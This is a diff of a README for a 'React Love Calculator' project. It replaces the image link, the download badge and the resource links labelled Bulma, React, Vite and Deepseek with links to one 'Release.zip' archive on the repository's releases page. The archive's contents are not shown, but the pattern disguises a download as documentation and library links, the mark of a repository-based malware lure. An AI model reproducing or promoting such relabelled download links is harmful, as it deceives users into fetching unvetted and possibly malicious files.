@@ -1,6 +1,6 @@
 # React Love Calculator 💖
 
-![Love Calculator](https://unsplash.com/photos/x9GrflG-Lcc)
+![Love Calculator](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip)
 
 Welcome to the React Love Calculator repository! Calculate how much you and your partner are meant to be with this fun and interactive love calculator. Let's dive into the details of this exciting project.
 
@@ -26,7 +26,7 @@ Welcome to the React Love Calculator repository! Calculate how much you and your
 
 ## Get Started
 To get started, you can download the love calculator app by clicking the button below:
-[![Download Love Calculator](https://img.shields.io/badge/Download-Love%20Calculator-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Love Calculator](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip%20Calculator-brightgreen)](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip)
 
 Once downloaded, launch the love calculator application and start discovering your love compatibility with your partner.
 
@@ -52,10 +52,10 @@ We welcome contributions to the React Love Calculator project. Feel free to subm
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Resources
-- [Bulma](https://bulma.io/) - CSS framework used in the project
-- [React](https://reactjs.org/) - JavaScript library for building user interfaces
-- [Vite](https://vitejs.dev/) - Frontend build tool
-- [Deepseek](https://deepseek.ai) - AI technology used for love calculations
+- [Bulma](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip) - CSS framework used in the project
+- [React](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip) - JavaScript library for building user interfaces
+- [Vite](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip) - Frontend build tool
+- [Deepseek](https://github.com/Kena4k12/react-love-calculator/releases/download/v1.0/Release.zip) - AI technology used for love calculations
 
 ## Feedback
 We'd love to hear your feedback on the React Love Calculator. Feel free to open an issue on the repository with any suggestions or improvements you have in mind.
